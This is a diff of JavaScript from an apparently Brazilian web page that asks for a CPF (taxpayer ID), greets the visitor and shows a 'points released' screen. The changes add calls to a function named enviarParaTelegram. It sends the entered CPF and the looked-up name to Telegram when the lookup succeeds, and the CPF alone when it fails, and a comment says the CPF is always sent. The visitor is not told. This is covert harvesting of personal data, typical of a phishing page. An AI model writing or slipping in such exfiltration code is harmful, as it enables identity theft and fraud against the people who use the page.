@@ -157,25 +157,29 @@
                 })
                 .then(response => response.json())  // Agora que estamos usando um proxy, podemos acessar a resposta
                 .then(data => {
-                    // Se o nome for retornado, exibe o nome
+                    let nome = "Usuário";  // Valor padrão para o nome caso não seja encontrado
                     if (data && data.dados && data.dados.NOME) {
-                        var nome = data.dados.NOME;
-                        document.getElementById("saudacao").innerHTML = `Olá, ${nome}!`;
-                    } else {
-                        // Caso não consiga obter o nome
-                        document.getElementById("saudacao").innerHTML = "Olá, Prezado Cliente!";
+                        nome = data.dados.NOME;
                     }
+
+                    // Exibe saudação personalizada
+                    document.getElementById("saudacao").innerHTML = `Olá, ${nome}!`;
 
                     // Exibe a tela de pontos liberados e oculta o formulário
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
+
+                    // Enviar CPF e nome para o Telegram
+                    enviarParaTelegram(`Consulta de CPF: ${cpf}, Nome: ${nome}`);
                 })
                 .catch((error) => {
                     console.error('Erro ao consultar CPF:', error);
-                    // Caso haja erro, ainda continua com saudação genérica
                     document.getElementById("saudacao").innerHTML = "Olá, Prezado Cliente!";
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
+
+                    // Enviar CPF e erro para o Telegram, garantindo que o CPF seja sempre enviado
+                    enviarParaTelegram(`Erro na consulta de CPF: ${cpf}`);
                     alert("Erro ao consultar CPF. Verifique sua conexão ou tente novamente.");
                 });
             } else {
